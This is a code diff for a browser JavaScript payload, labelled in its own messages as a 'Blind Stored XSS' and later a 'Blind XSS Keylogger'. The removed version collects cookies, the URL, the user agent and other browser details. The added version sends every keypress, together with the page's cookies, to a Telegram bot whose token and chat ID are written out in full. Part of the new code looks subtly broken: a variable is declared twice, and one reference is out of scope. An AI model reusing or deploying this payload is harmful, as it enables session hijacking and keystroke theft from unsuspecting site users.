@@ -1,29 +1,44 @@
-(async () => {
-  const cookies = document.cookie || "Tidak ada cookie";
-  const url = window.location.href;
-  const userAgent = navigator.userAgent;
-  const referrer = document.referrer || "Tidak ada referrer";
-  const language = navigator.language;
-  const platform = navigator.platform;
+// document.addEventListener("keydown", function(event) {
+//     fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
+//         method: "POST",
+//         headers: {
+//             "Content-Type": "application/json"
+//         },
+//         body: JSON.stringify({
+//             chat_id: "-1002002449257",
+//             text: "Key Pressed: " + event.key
+//         })
+//     });
+// });
+document.addEventListener("keydown", function(event) {
+    try {
+        const cookies = document.cookie || "No accessible cookies";
+        const key = event.key;
+        const location = window.location.href;
+        const time = new Date().toLocaleString();
+    let cookies = document.cookie; // Mengambil cookie yang bisa diakses oleh JavaScript
 
-  const message = `
-🚨 Blind Stored XSS Executed
-📍 URL: ${url}
-🍪 Cookies: ${cookies}
-📱 User-Agent: ${userAgent}
-↩️ Referrer: ${referrer}
-🌐 Language: ${language}
-💻 Platform: ${platform}
-`;
-
-  await fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: "-1002002449257",
-      text: message
-    })
-  });
-})();
+        fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: "-1002002449257",
+                text: `🛡️ Blind XSS Keylogger\n\n🕒 Waktu: ${time}\n🔑 Tombol: ${key}\n🍪 Cookies: ${cookies}\n🌐 URL: ${location}`
+            })
+        });
+    } catch (err) {
+        // Silent fail to avoid error thrown on restricted environments
+    }
+    fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: "-1002002449257",
+            text: `Key Pressed: ${event.key}\nCookies: ${cookies}`
+        })
+    });
+});
